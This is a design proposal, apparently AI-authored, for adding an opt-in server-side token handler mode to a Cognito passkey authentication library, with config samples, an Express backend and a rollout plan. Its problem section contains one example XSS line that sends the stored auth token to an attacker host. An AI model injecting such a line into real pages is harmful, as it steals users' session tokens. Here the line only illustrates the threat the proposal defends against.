# v1.0 Token Storage Proposal

**Status:** Draft for review
**Author:** Claude (automated)
**Date:** January 21, 2026

---

## Executive Summary

For v1.0, I recommend adding a **Token Handler mode** as an opt-in secure alternative to localStorage. This provides a clear security upgrade path without breaking existing users.

---

## The Problem

localStorage tokens are vulnerable to XSS:

```javascript
// Any malicious script can do this
fetch('https://attacker.com/steal?t=' + localStorage.getItem('l42_auth_tokens'));
```

Real-world impact: 2025 Drift breach affected 700+ organizations via token theft.

---

## Recommended Solution: Token Handler Mode

### Overview

Add a new `tokenStorage: 'handler'` option where:
- Tokens are stored **server-side** in an HttpOnly session
- Library fetches tokens from your backend endpoint
- Tokens kept in **memory only** on the client
- XSS cannot steal tokens (they're never in JavaScript-accessible storage)

### Configuration

```javascript
// Current behavior (unchanged, backward compatible)
configure({
    clientId: 'xxx',
    cognitoDomain: 'xxx.auth.region.amazoncognito.com'
    // tokenStorage defaults to 'localStorage'
});

// New secure mode (opt-in)
configure({
    clientId: 'xxx',
    cognitoDomain: 'xxx.auth.region.amazoncognito.com',
    tokenStorage: 'handler',
    tokenEndpoint: '/auth/token',
    refreshEndpoint: '/auth/refresh',
    logoutEndpoint: '/auth/logout'
});
```

### How It Works

```
┌─────────────────────────────────────────────────────────────────┐
│                         CURRENT (localStorage)                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Browser                                                         │
│     │                                                            │
│     ├── localStorage: { access_token, refresh_token } ← XSS!    │
│     │                                                            │
│     └── Direct API calls with Bearer token                       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                      NEW (Token Handler)                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Browser                        Your Backend                     │
│     │                               │                            │
│     │ ←─ HttpOnly cookie ──────────┤ (session with tokens)      │
│     │                               │                            │
│     │ ── GET /auth/token ─────────→│                            │
│     │ ←─ { accessToken } ──────────│                            │
│     │                               │                            │
│     │ (token in MEMORY only)        │                            │
│     │                               │                            │
│     └── API call ─────────────────→ Resource API                 │
│                                                                  │
│  XSS cannot steal tokens - they're server-side!                  │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### What Users Provide

A minimal backend with 3 endpoints (~50 lines of code):

```javascript
// Express.js example
const express = require('express');
const session = require('express-session');

const app = express();

app.use(session({
    secret: process.env.SESSION_SECRET,
    cookie: { httpOnly: true, secure: true, sameSite: 'strict' }
}));

// Return token to SPA (kept in memory, not localStorage)
app.get('/auth/token', (req, res) => {
    if (!req.session.tokens) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    res.json({
        accessToken: req.session.tokens.access_token,
        expiresAt: req.session.tokens.expires_at
    });
});

// Refresh tokens server-side
app.post('/auth/refresh', async (req, res) => {
    if (!req.session.tokens?.refresh_token) {
        return res.status(401).json({ error: 'No refresh token' });
    }

    const newTokens = await refreshWithCognito(req.session.tokens.refresh_token);
    req.session.tokens = newTokens;
    res.json({ accessToken: newTokens.access_token });
});

// Clear session
app.post('/auth/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// OAuth callback - store tokens in session
app.get('/auth/callback', async (req, res) => {
    const tokens = await exchangeCodeForTokens(req.query.code, req.query.state);
    req.session.tokens = tokens;
    res.redirect('/');
});
```

---

## Library Changes Required

### New Config Options

```typescript
interface AuthConfig {
    // ... existing options ...

    tokenStorage?: 'localStorage' | 'memory' | 'handler';
    tokenEndpoint?: string;      // for handler mode
    refreshEndpoint?: string;    // for handler mode
    logoutEndpoint?: string;     // for handler mode
}
```

### Modified Functions

| Function | localStorage mode | handler mode |
|----------|-------------------|--------------|
| `getTokens()` | Sync, reads localStorage | **Async**, fetches from endpoint |
| `setTokens()` | Writes to localStorage | No-op (server manages) |
| `refreshTokens()` | Calls Cognito directly | Calls refresh endpoint |
| `logout()` | Clears localStorage | Calls logout endpoint |
| `isAuthenticated()` | Sync check | **Async** check |

### New Helper

```javascript
// Convenience wrapper for authenticated requests
export async function fetchWithAuth(url, options = {}) {
    const tokens = await ensureValidTokens();
    if (!tokens) throw new Error('Not authenticated');

    return fetch(url, {
        ...options,
        headers: {
            ...options.headers,
            'Authorization': `Bearer ${tokens.access_token}`
        }
    });
}
```

### Breaking Change: Async in Handler Mode

In handler mode, `getTokens()` and `isAuthenticated()` become async:

```javascript
// localStorage mode (current, unchanged)
if (isAuthenticated()) { ... }
const tokens = getTokens();

// handler mode (new)
if (await isAuthenticated()) { ... }
const tokens = await getTokens();
```

This is only breaking for users who opt into handler mode.

---

## Rollout Plan

### v0.7.0 - Memory Mode

Add `tokenStorage: 'memory'` option:
- Tokens stored in JavaScript variable only
- Page reload = logout
- No breaking changes
- Useful for high-security apps that want no persistence

### v0.8.0 - Handler Mode

Add `tokenStorage: 'handler'` option:
- Full token handler implementation
- Sample backends (Express, Lambda, Cloudflare Workers)
- Migration guide

### v0.9.0 - Production Ready (Token Handler)

- Handler mode fully tested in production
- Default remains `localStorage` (backward compatible)
- Handler mode documented as **recommended for production**
- Decision guide: "Which storage mode should I use?"
- Run v0.9 in production for extended period to validate

### v1.0.0 - Stable Release (Wait for DPoP)

**Target: When AWS Cognito adds DPoP support**

- DPoP integration (see `dpop-future.md`)
- Token Handler as fallback for non-DPoP environments
- Full security certification
- LTS (Long Term Support) commitment

**Rationale:** DPoP provides the strongest token protection. Waiting for Cognito support means v1.0 ships with best-in-class security.

---

## Decision Guide (for v1.0 docs)

```
┌─────────────────────────────────────────────────────────────┐
│            Which token storage mode should I use?            │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Is this an internal tool with no third-party scripts?       │
│     YES → localStorage is acceptable                         │
│     NO  ↓                                                    │
│                                                              │
│  Do you have a backend you can modify?                       │
│     YES → Use handler mode (recommended)                     │
│     NO  ↓                                                    │
│                                                              │
│  Can you deploy a simple serverless function?                │
│     YES → Use handler mode with Lambda/Workers               │
│     NO  ↓                                                    │
│                                                              │
│  Is this a static site with no backend at all?               │
│     YES → Use localStorage + strict CSP                      │
│           (document the risk, implement monitoring)          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## What This Means for Users

### Existing Users (localStorage)

**No changes required.** Everything works as before.

### Users Who Want Better Security

1. Deploy the sample backend (or adapt to their stack)
2. Change one config option: `tokenStorage: 'handler'`
3. Update any sync `getTokens()` calls to async

### New Users

Documentation will recommend handler mode for production, with localStorage as a quick-start option for development.

---

## Alternatives Considered

### Alternative 1: Change Default to Memory

- **Rejected** because page-reload logout is terrible UX
- Users would immediately override to localStorage anyway

### Alternative 2: Full BFF Proxy

- Library proxies ALL API calls through backend
- **Rejected** as too complex and opinionated
- Performance overhead for every request

### Alternative 3: Web Worker Isolation

- Store tokens in Web Worker scope
- **Rejected** because:
  - No persistence (reload loses tokens)
  - Attacker can still intercept postMessage
  - Complex implementation

### Alternative 4: Wait for DPoP

- **Rejected** because AWS Cognito doesn't support it yet
- See `docs/dpop-future.md` for integration plan when available

---

## Open Questions

1. **Async breaking change** - Is it acceptable that handler mode requires async `getTokens()`?

2. **Sample backends** - Which platforms should we provide samples for?
   - Express.js (Node)
   - AWS Lambda
   - Cloudflare Workers
   - Others?

3. **OAuth callback** - Should the library handle the callback in handler mode, or leave it to the user's backend?

---

## Next Steps

GitHub Issues Created:

1. [x] [#4 - v0.7.0: Memory mode](https://github.com/lexicone42/l42-cognito-passkey/issues/4)
2. [x] [#5 - v0.8.0: Handler mode](https://github.com/lexicone42/l42-cognito-passkey/issues/5)
3. [x] [#6 - v0.9.0: Production ready](https://github.com/lexicone42/l42-cognito-passkey/issues/6)

Implementation Order:

1. [ ] Implement memory mode (#4)
2. [ ] Implement handler mode (#5)
3. [ ] Write sample backends
4. [ ] Production validation (#6)
5. [ ] Wait for Cognito DPoP support
6. [ ] Release v1.0.0 with DPoP

---

## Summary

| Aspect | Recommendation |
|--------|----------------|
| Default storage | Keep localStorage (backward compat) |
| New option | Add `tokenStorage: 'handler'` |
| Breaking changes | Only in handler mode (async) |
| User requirement | Small backend for handler mode |
| Security improvement | Significant (XSS can't steal tokens) |
| Timeline | v0.7 → v0.8 → v1.0 |
